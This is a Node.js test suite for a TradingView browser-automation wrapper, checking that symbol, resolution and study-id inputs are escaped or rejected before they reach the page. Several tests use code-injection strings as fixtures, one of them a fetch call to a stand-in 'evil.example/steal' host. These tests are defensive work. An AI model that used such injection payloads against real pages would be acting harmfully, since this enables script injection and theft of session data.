import test from "node:test";
import assert from "node:assert/strict";
import { TradingView } from "../../build/tradingview.js";

/** Fake CdpClient that records expressions instead of talking to a page. */
function fakeCdp(result = {}) {
  const calls = [];
  return {
    calls,
    evaluate(expression) {
      calls.push(expression);
      return Promise.resolve(result);
    },
  };
}

test("setSymbol embeds the symbol as a JSON string literal (no code injection)", async () => {
  const cdp = fakeCdp({ symbol: "X", resolution: "1D" });
  const tv = new TradingView(cdp);
  const hostile = `BTC"); fetch("https://evil.example/steal"); ("`;
  await tv.setSymbol(hostile);

  const expr = cdp.calls[0];
  // the hostile payload must appear only in its escaped JSON form
  assert.ok(expr.includes(JSON.stringify(hostile)), "payload should be JSON-escaped");
  assert.ok(!expr.includes(`("${hostile}"`), "raw payload must not be spliced into code");
  // sanity: the escaped form neutralizes the quote that would break out of the literal
  assert.ok(!expr.includes(`BTC");`));
});

test("setResolution rejects strings that are not resolution-shaped", async () => {
  const tv = new TradingView(fakeCdp());
  for (const bad of ["", "1); hack(", "abc", "1D'; drop", "60m2"]) {
    assert.throws(() => tv.setResolution(bad), /resolution must look like/, bad);
  }
});

test("setResolution accepts typical TradingView resolutions", async () => {
  const cdp = fakeCdp({ symbol: "X", resolution: "1D" });
  const tv = new TradingView(cdp);
  for (const ok of ["1", "5", "15", "60", "240", "1D", "1W", "1M", "D", "W"]) {
    await tv.setResolution(ok);
  }
  assert.equal(cdp.calls.length, 10);
});

test("setSymbol rejects empty input", () => {
  const tv = new TradingView(fakeCdp());
  assert.throws(() => tv.setSymbol(""), /non-empty/);
  assert.throws(() => tv.setSymbol("   "), /non-empty/);
});

test("setSymbol/setResolution do not report stale state as success on timeout", async () => {
  const cdp = fakeCdp({});
  const tv = new TradingView(cdp);
  await tv.setSymbol("BTCUSD");
  await tv.setResolution("240");
  for (const expr of cdp.calls) {
    assert.ok(expr.includes("clearTimeout(timer)"), "callback must cancel the timeout");
    assert.ok(expr.includes("did not take effect"), "timeout with unchanged state must reject");
    assert.ok(expr.includes("changed:") || expr.includes("changed "), "result must carry a changed flag");
  }
  // symbol matching must tolerate exchange prefixes the page adds
  assert.ok(cdp.calls[0].includes('a.endsWith(":" + r)'));
});

test("getChartContext exposes study ids alongside names", async () => {
  const cdp = fakeCdp({ charts: [] });
  const tv = new TradingView(cdp);
  await tv.getChartContext();
  assert.ok(
    cdp.calls[0].includes("({ id: s.id, name: s.name })"),
    "studies must include the id used by get_indicator_* tools",
  );
});

test("getOhlcv validates count and chartIndex before touching the page", () => {
  const cdp = fakeCdp();
  const tv = new TradingView(cdp);
  assert.throws(() => tv.getOhlcv(NaN), /count must be/);
  assert.throws(() => tv.getOhlcv(0), /count must be/);
  assert.throws(() => tv.getOhlcv(-5), /count must be/);
  assert.throws(() => tv.getOhlcv(Infinity), /count must be/);
  assert.throws(() => tv.getOhlcv(10, 1.5), /chartIndex must be/);
  assert.throws(() => tv.getOhlcv(10, -1), /chartIndex must be/);
  assert.throws(() => tv.getOhlcv(10, "1); hack("), /chartIndex must be/);
  assert.equal(cdp.calls.length, 0, "no expression should reach the page");
});

test("getOhlcv floors fractional counts and targets the right chart", async () => {
  const cdp = fakeCdp({ symbol: "X", resolution: "1D", count: 0, bars: [] });
  const tv = new TradingView(cdp);
  await tv.getOhlcv(10.9, 1);
  const expr = cdp.calls[0];
  assert.ok(expr.includes("slice(-10)"), "fractional count should floor");
  assert.ok(expr.includes("api.chart(1)"), "should target chart 1");

  await tv.getOhlcv(5);
  assert.ok(cdp.calls[1].includes("api.activeChart()"), "default is active chart");
});

test("getIndicatorValues validates studyId, count and chartIndex before touching the page", () => {
  const cdp = fakeCdp();
  const tv = new TradingView(cdp);
  for (const badId of ['"); hack(); ("', "a b", "x".repeat(65), "évil", ""]) {
    assert.throws(() => tv.getIndicatorValues({ studyId: badId }), /studyId must match/, badId);
  }
  assert.throws(() => tv.getIndicatorValues({ count: 0 }), /count must be/);
  assert.throws(() => tv.getIndicatorValues({ count: NaN }), /count must be/);
  assert.throws(() => tv.getIndicatorValues({ chartIndex: -1 }), /chartIndex must be/);
  assert.equal(cdp.calls.length, 0, "no expression should reach the page");
});

test("getIndicatorValues embeds studyId as a JSON literal and honors options", async () => {
  const cdp = fakeCdp([]);
  const tv = new TradingView(cdp);
  await tv.getIndicatorValues({ studyId: "mlahPw", count: 5.9, chartIndex: 1, includeAllPlots: true });
  const expr = cdp.calls[0];
  assert.ok(expr.includes('"mlahPw"'), "studyId should be quoted");
  assert.ok(expr.includes("const maxBars = 5"), "fractional count should floor");
  assert.ok(expr.includes("api.chart(1)"), "should target chart 1");
  assert.ok(expr.includes("const includeAllPlots = true"));

  await tv.getIndicatorValues();
  const expr2 = cdp.calls[1];
  assert.ok(expr2.includes("const studyIdFilter = null"), "default is all studies");
  assert.ok(expr2.includes("api.activeChart()"), "default is active chart");
  assert.ok(expr2.includes("const includeAllPlots = false"));
});

test("getIndicatorInputs validates ids and always excludes Pine-internal inputs", async () => {
  const cdp = fakeCdp([]);
  const tv = new TradingView(cdp);
  assert.throws(() => tv.getIndicatorInputs({ studyId: '1"; steal()' }), /studyId must match/);
  assert.equal(cdp.calls.length, 0);

  await tv.getIndicatorInputs({ studyId: "XfUjdm" });
  const expr = cdp.calls[0];
  for (const hidden of ["text", "pineId", "pineVersion", "pineFeatures"]) {
    assert.ok(expr.includes(`"${hidden}"`), `HIDDEN set must contain ${hidden}`);
  }
  assert.ok(expr.includes("truncated"), "long string values must be truncated");
});

test("getIndicatorGraphics validates inputs before touching the page", () => {
  const cdp = fakeCdp();
  const tv = new TradingView(cdp);
  assert.throws(() => tv.getIndicatorGraphics({ studyId: '"); hack(' }), /studyId must match/);
  assert.throws(() => tv.getIndicatorGraphics({ limitPerKind: 0 }), /limitPerKind must be/);
  assert.throws(() => tv.getIndicatorGraphics({ limitPerKind: 501 }), /limitPerKind must be/);
  assert.throws(() => tv.getIndicatorGraphics({ limitPerKind: 2.5 }), /limitPerKind must be/);
  assert.throws(() => tv.getIndicatorGraphics({ chartIndex: -1 }), /chartIndex must be/);
  assert.equal(cdp.calls.length, 0);
});

test("getIndicatorGraphics reads both raw and materialized primitive stores", async () => {
  const cdp = fakeCdp([]);
  const tv = new TradingView(cdp);
  await tv.getIndicatorGraphics({ studyId: "lSZ7z5", limitPerKind: 10 });
  const expr = cdp.calls[0];
  assert.ok(expr.includes('"lSZ7z5"'), "studyId quoted as JSON");
  for (const kind of ["dwglabels", "dwglines", "dwgboxes"]) {
    assert.ok(expr.includes(kind), `must read ${kind}`);
  }
  assert.ok(expr.includes("_primitivesDataById"), "raw store");
  assert.ok(expr.includes("_primitiveById"), "materialized store");
  assert.ok(expr.includes("const limit = 10"));
});

test("loadMoreHistory validates count and builds a requestMoreData call", async () => {
  const cdp = fakeCdp({ requested: 1, barsBefore: 0, barsAfter: 0, added: 0, earliestTime: null, moreAvailable: null });
  const tv = new TradingView(cdp);
  assert.throws(() => tv.loadMoreHistory({ count: 0 }), /count must be/);
  assert.throws(() => tv.loadMoreHistory({ count: 5001 }), /count must be/);
  assert.throws(() => tv.loadMoreHistory({ count: 1.5 }), /count must be/);
  assert.equal(cdp.calls.length, 0);

  await tv.loadMoreHistory({ count: 250, chartIndex: 1 });
  const expr = cdp.calls[0];
  assert.ok(expr.includes("requestMoreData(requested)"));
  assert.ok(expr.includes("const requested = 250"));
  assert.ok(expr.includes("api.chart(1)"));
});

test("listAlerts fetches the alerts API read-only with the app session", async () => {
  const cdp = fakeCdp([]);
  const tv = new TradingView(cdp);
  await tv.listAlerts();
  const expr = cdp.calls[0];
  assert.ok(expr.includes("https://pricealerts.tradingview.com/list_alerts"));
  assert.ok(expr.includes('credentials: "include"'));
  assert.ok(!/create_alert|modify|delete/.test(expr), "must stay read-only");
});

test("getWatchlists fetches the symbols_list API with the app session", async () => {
  const cdp = fakeCdp([]);
  const tv = new TradingView(cdp);
  await tv.getWatchlists();
  const expr = cdp.calls[0];
  assert.ok(expr.includes("https://www.tradingview.com/api/v1/symbols_list/custom/"));
  assert.ok(expr.includes('credentials: "include"'), "must use the logged-in session");
  assert.ok(expr.includes('startsWith("###")'), "must handle section headers");
});

test("getChartContext returns the page value as-is", async () => {
  const ctx = { layoutName: "L", activeChartIndex: 0, chartsCount: 1, charts: [] };
  const tv = new TradingView(fakeCdp(ctx));
  assert.deepEqual(await tv.getChartContext(), ctx);
});
